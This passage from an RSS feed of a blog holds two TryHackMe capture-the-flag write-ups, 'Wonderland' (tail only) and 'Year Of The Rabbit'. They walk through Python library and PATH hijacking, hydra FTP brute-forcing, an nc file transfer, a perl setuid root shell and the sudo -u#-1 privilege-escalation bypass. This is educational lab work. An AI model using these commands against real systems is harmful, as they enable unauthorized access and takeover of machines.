&lt;p&gt;But &amp;hellip; we do not have any permissions to write the file. So how? Well, this is something called &lt;strong&gt;python library hijacking&lt;/strong&gt;. Take a wild guess to what we are going to do.&lt;/p&gt;
&lt;p&gt;Yeah, create a file called &lt;code&gt;random.py&lt;/code&gt;, essentially overriding the actual random library. Lesgooo!&lt;/p&gt;
&lt;p&gt;&lt;code&gt;random.py&lt;/code&gt; looks as: &lt;code&gt;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&lt;/code&gt;. easy.&lt;/p&gt;
&lt;p&gt;Executing, we have:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py 
rabbit@wonderland:~$ 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;YES! okay so we see:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;rabbit@wonderland:/home/rabbit$ ls
teaParty
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;which has a set bit &amp;hellip;!?&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;rabbit@wonderland:/home/rabbit$ ./teaParty 
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Sat, 27 Feb 2021 05:19:12 +0000
Ask very nicely, and I will give you some tea while you wait for him

Segmentation fault (core dumped)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This may include some reverse engineering. Anyways, linpeas gave us this:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[+] Sudo version
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version                                                         
Sudo version 1.8.21p2 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;However,&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;rabbit@wonderland:/home/rabbit$ sudo -u#-1 /bin/bash
sudo: unknown user: #-1
sudo: unable to initialize policy plugin
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So, back to reverse engineering it is! I wanted to start off with &lt;code&gt;strings&lt;/code&gt;, but it does not want to work, since strings is not present on that machine. So, I need to transfer the file to my machine, then extract out the information I need.&lt;/p&gt;
&lt;p&gt;For this, we start &lt;code&gt;nc&lt;/code&gt; on both;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;rabbit@wonderland:/home/rabbit$ nc 10.8.150.214 1234 &amp;lt; teaParty&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Explaination: netcat tries to connect to the IP &lt;code&gt;10.8.150.214&lt;/code&gt; on the port &lt;code&gt;1234&lt;/code&gt; using &lt;code&gt;TCP&lt;/code&gt;, and takes in the file as the input.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;❯ nc -lnvp 1234 &amp;gt; temp&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Explaination: netcat &lt;em&gt;listens&lt;/em&gt; on the port &lt;code&gt;1234&lt;/code&gt; on your machine, outputting all the contents into a file called &lt;code&gt;temp&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Ok! Doing strings, we see: &lt;code&gt;/bin/echo -n &#39;Probably by &#39; &amp;amp;&amp;amp; date --date=&#39;next hour&#39; -R&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;We can make use of the &lt;code&gt;date&lt;/code&gt; library in C. Also, no matter our input, we get &lt;code&gt;Segmentation fault (core dumped)&lt;/code&gt;, as its in the string. Very sneaky! Now, we want it to execute the &lt;code&gt;date&lt;/code&gt; file. We can just write: &lt;code&gt;bash&lt;/code&gt; in it and make it executable by using &lt;code&gt;chmod +x date&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;rabbit@wonderland:/home/rabbit$ PATH=/home/rabbit:$PATH ./teaParty 
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by hatter@wonderland:/home/rabbit$ 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;:D Inside of &lt;code&gt;/home/hatter&lt;/code&gt;, we get&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;hatter@wonderland:/home/hatter$ cat password.txt 
&amp;lt;PASSWORD&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now, we can login as hatter normally, instead of this convoluted mess.&lt;/p&gt;
&lt;p&gt;(We are still in alice&amp;rsquo;s random&amp;rsquo;s rabbit&amp;rsquo;s teaParty shell lmao)&lt;/p&gt;
&lt;p&gt;Okay take a deep breath in. Fresh shell! However &amp;hellip;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;hatter@wonderland:~$ sudo -l
[sudo] password for hatter: 
Sorry, user hatter may not run sudo on wonderland.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;SMH.&lt;/p&gt;
&lt;p&gt;Time for linpeas again!&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;❯ scp ~/Desktop/Tools/linpeas.sh hatter@10.10.27.106:~
hatter@10.10.27.106&#39;s password: 
linpeas.sh                    100%  313KB 188.7KB/s   00:01    
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Okay so the below pops out, talking about suid bit setting capabilities:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Files with capabilities:
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Perl looks tasty, so &lt;a class=&#34;link&#34; href=&#34;https://gtfobins.github.io/gtfobins/perl/#capabilities&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;gtfobins&lt;/a&gt; tells us the following.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;cp $(which perl) .&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;hatter@wonderland:~$ perl -e &#39;use POSIX qw(setuid); POSIX::setuid(0); exec &amp;quot;/bin/sh&amp;quot;;&#39;
# whoami
root
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;EASY!&lt;/p&gt;
</description>
        </item>
        <item>
        <title>TryHackMe: Year Of The Rabbit Writeup</title>
        <link>https://chaudhary1337.github.io/p/tryhackme-year-of-the-rabbit-writeup/</link>
        <pubDate>Tue, 15 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://chaudhary1337.github.io/p/tryhackme-year-of-the-rabbit-writeup/</guid>
        <description>&lt;img src="https://i.imgur.com/EKb6pFE.png" alt="Featured image of post TryHackMe: Year Of The Rabbit Writeup" /&gt;&lt;h2 id=&#34;challenge-room&#34;&gt;Challenge Room&lt;/h2&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/yearoftherabbit&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Play here&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;recon&#34;&gt;Recon&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Go to the website&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Run a gobuster scan&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Run a nmap scan&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Website is the deafault apache website. Let&amp;rsquo;s see if anything looks off. So the &lt;code&gt;css&lt;/code&gt; is usually in the website, as seen from the &lt;code&gt;actual default page&lt;/code&gt;. Here, its from &lt;code&gt;/assets/style.css&lt;/code&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Gobuster also shows the same assets folder&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Nmap scan looks pretty basic:&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;❯ nmap -script=default -sV -A -T4 10.10.77.156
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-24 21:18 EST
Nmap scan report for 10.10.77.156
Host is up (0.19s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)
|   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)
|   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)
|_  256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519)
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Apache2 Debian Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.80 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/S8SXhtb.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Meanwhile, let&amp;rsquo;s have a look at what&amp;rsquo;s exploitable&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;❯ searchsploit openssh 6.7p1
--------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                     |  Path
--------------------------------------------------------------------------------------------------- ---------------------------------
OpenSSH 2.3 &amp;lt; 7.7 - Username Enumeration                                                           | linux/remote/45233.py
OpenSSH 2.3 &amp;lt; 7.7 - Username Enumeration (PoC)                                                     | linux/remote/45210.py
OpenSSH &amp;lt; 7.4 - &#39;UsePrivilegeSeparation Disabled&#39; Forwarded Unix Domain Sockets Privilege Escalati | linux/local/40962.txt
OpenSSH &amp;lt; 7.4 - agent Protocol Arbitrary Library Loading                                           | linux/remote/40963.txt
OpenSSH &amp;lt; 7.7 - User Enumeration (2)                                                               | linux/remote/45939.py
--------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
❯ searchsploit vsftpd 3.0.2
Exploits: No Results
Shellcodes: No Results
❯ searchsploit httpd 2.4.10
--------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                     |  Path
--------------------------------------------------------------------------------------------------- ---------------------------------
OpenBSD HTTPd &amp;lt; 6.0 - Memory Exhaustion Denial of Service                                          | openbsd/dos/41278.txt
--------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So we do have some paths that we can take later down, but currently, we need a foothold.&lt;/p&gt;
&lt;p&gt;While looking around, I first of all got rickrolled ;-; and secondly, found this&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  /* Nice to see someone checking the stylesheets.
     Take a look at the page: /sup3r_s3cr3t_fl4g.php
  */
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nice. Let&amp;rsquo;s go there.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/ahceSmx.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Very intersting. The page then redirects me to &amp;hellip; ANOTHER RICKROLL. 😠 Let&amp;rsquo;s try turning off the javascript.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/YZcZK4D.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Well well well. Anyways, I want to have a look at the traffic, and how this redirect is happening. Let&amp;rsquo;s fire up burp.&lt;/p&gt;
&lt;p&gt;Ah yes. We have&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/CTrYkbh.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s go there&lt;/p&gt;
&lt;p&gt;So we have this guy as the url now: &lt;code&gt;http://10.10.77.156/WExYY2Cv-qU/&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Going there we have:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/SkYGtVx.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;and a reverse image search tells us &amp;hellip; the image is of Lena Forsen, some Swedish model. I don&amp;rsquo;t know how this is helpful.&lt;/p&gt;
&lt;p&gt;I see no other place for exploration, so this is it then. We will search image for oddities.&lt;/p&gt;
&lt;p&gt;Nice! doing &lt;code&gt;strings&lt;/code&gt; on the &lt;code&gt;Hot_Babe.png&lt;/code&gt; shows the ftp username and a list of passwords:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Eh, you&#39;ve earned this. Username for FTP is ftpuser
One of these is the password:
Mou+56n%QK8sr
1618B0AUshw1M
A56IpIl%1s02u
vTFbDzX9&amp;amp;Nmu?
FfF~sfu^UQZmT
...
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I&amp;rsquo;ll run &lt;code&gt;hydra&lt;/code&gt; on it, just because they have a nice starting message :)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;❯ hydra -l ftpuser -P pass.txt ftp://10.10.186.25
Hydra v9.1 (c) 2020 by van Hauser/THC &amp;amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-02-24 23:01:00
[DATA] max 16 tasks per 1 server, overall 16 tasks, 82 login tries (l:1/p:82), ~6 tries per task
[DATA] attacking ftp://10.10.186.25:21/
[21][ftp] host: 10.10.186.25   login: ftpuser   password: {brrrrrrrrr}
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-02-24 23:01:16
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Yay!&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;❯ ftp 10.10.186.25
Connected to 10.10.186.25.
220 (vsFTPd 3.0.2)
Name (10.10.186.25:tanishq): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&amp;gt; ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             758 Jan 23  2020 Eli&#39;s_Creds.txt
226 Directory send OK.
ftp&amp;gt; get &amp;quot;Eli&#39;s_Creds.txt&amp;quot;
local: Eli&#39;s_Creds.txt remote: Eli&#39;s_Creds.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for Eli&#39;s_Creds.txt (758 bytes).
226 Transfer complete.
758 bytes received in 0.00 secs (3.2562 MB/s)
ftp&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;foothold&#34;&gt;Foothold&lt;/h2&gt;
&lt;p&gt;Opening the creds we get something &amp;hellip; this looks like brainfuck, the langauge. yes! compiling it, we get:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;User: eli
Password: {brrrrrrrrrrr}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;There&amp;rsquo;s nothing else, so let&amp;rsquo;s login as &lt;code&gt;eli&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;❯ ftp 10.10.186.25
Connected to 10.10.186.25.
220 (vsFTPd 3.0.2)
Name (10.10.186.25:tanishq): eli
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&amp;gt; ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 1000     1000         4096 Jan 23  2020 Desktop
drwxr-xr-x    2 1000     1000         4096 Jan 23  2020 Documents
drwxr-xr-x    2 1000     1000         4096 Jan 23  2020 Downloads
drwxr-xr-x    2 1000     1000         4096 Jan 23  2020 Music
drwxr-xr-x    2 1000     1000         4096 Jan 23  2020 Pictures
drwxr-xr-x    2 1000     1000         4096 Jan 23  2020 Public
drwxr-xr-x    2 1000     1000         4096 Jan 23  2020 Templates
drwxr-xr-x    2 1000     1000         4096 Jan 23  2020 Videos
-rw-------    1 1000     1000       589824 Jan 23  2020 core
226 Directory send OK.
ftp&amp;gt; pwd
257 &amp;quot;/&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;After spending some disappointing amount of time on this, I realised we can using &lt;code&gt;ssh&lt;/code&gt;. &amp;lt;insert disappointment meme :( &amp;gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;❯ ssh eli@10.10.186.25
The authenticity of host &#39;10.10.186.25 (10.10.186.25)&#39; can&#39;t be established.
ECDSA key fingerprint is SHA256:ISBm3muLdVA/w4A1cm7QOQQOCSMRlPdDp/x8CNpbJc8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added &#39;10.10.186.25&#39; (ECDSA) to the list of known hosts.
eli@10.10.186.25&#39;s password: 


1 new message
Message from Root to Gwendoline:

&amp;quot;Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I&#39;ve left you a hidden message there&amp;quot;

END MESSAGE




eli@year-of-the-rabbit:~$ ls
core  Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos
eli@year-of-the-rabbit:~$ 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Works! Now, I use the &lt;code&gt;locate&lt;/code&gt; command to find all &lt;code&gt;*.txt&lt;/code&gt; and I find these interesting things:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/home/gwendoline/user.txt&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/var/ftp/uploads/Eli&#39;s_Creds.txt&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;We know the second one. The first one is what we are after.&lt;/p&gt;
&lt;p&gt;Unsurprisingly, we have&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-r--r----- 1 gwendoline gwendoline   46 Jan 23  2020 user.txt&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Now, they do mention some common secret place in the message when we first loggied in.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;eli@year-of-the-rabbit:~$ locate s3cr3t
/usr/games/s3cr3t
/usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
/var/www/html/sup3r_s3cr3t_fl4g.php
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;GG.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;eli@year-of-the-rabbit:~$ cat /usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
Your password is awful, Gwendoline. 
It should be at least 60 characters long! Not just {brrrrrrrrrrrr}
Honestly!

Yours sincerely
   -Root
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;lmao. okay, back to business. Logging as her, we get:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gwendoline@year-of-the-rabbit:~$ cat user.txt 
THM{pwned}
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;priv-esc&#34;&gt;Priv Esc&lt;/h2&gt;
&lt;p&gt;So we have&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gwendoline@year-of-the-rabbit:/$ sudo -l
Matching Defaults entries for gwendoline on year-of-the-rabbit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We can access &lt;code&gt;user.txt&lt;/code&gt; using &lt;code&gt;vi&lt;/code&gt; for some reason. The issue is, it says everyone except root can make it work. So &amp;hellip; can&amp;rsquo;t really do anything.&lt;/p&gt;
&lt;p&gt;At this point, &lt;code&gt;linpeas&lt;/code&gt; looks like it could help. So, I&amp;rsquo;ll scp that file to the machine.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;❯ scp linpeas.sh gwendoline@10.10.186.25:~
gwendoline@10.10.186.25&#39;s password: 
linpeas.sh     100%  313KB 188.9KB/s   00:01
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I&amp;rsquo;ll let it run in the background. So I did not find anything much interesting, except &lt;code&gt;exim4&lt;/code&gt; that it marked in red. Going up, we have:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[+] Sudo version
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version                                                         
Sudo version 1.8.10p3 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Very nice. So we have the &lt;a class=&#34;link&#34; href=&#34;https://www.exploit-db.com/exploits/47502&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;exploit&lt;/a&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gwendoline@year-of-the-rabbit:~$ sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt

root@year-of-the-rabbit:/home/gwendoline# whoami
root
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;When you are in &lt;code&gt;vi&lt;/code&gt;, go in the command more by pressing &lt;code&gt;:&lt;/code&gt; and then run the command &lt;code&gt;!/bin/bash&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root@year-of-the-rabbit:/# locate *.txt
...
/root/root.txt
...
&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;root@year-of-the-rabbit:/# cat /root/root.txt
THM{l33t}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;PWNED!&lt;/p&gt;
</description>
        </item>
        
    </channel>
</rss>
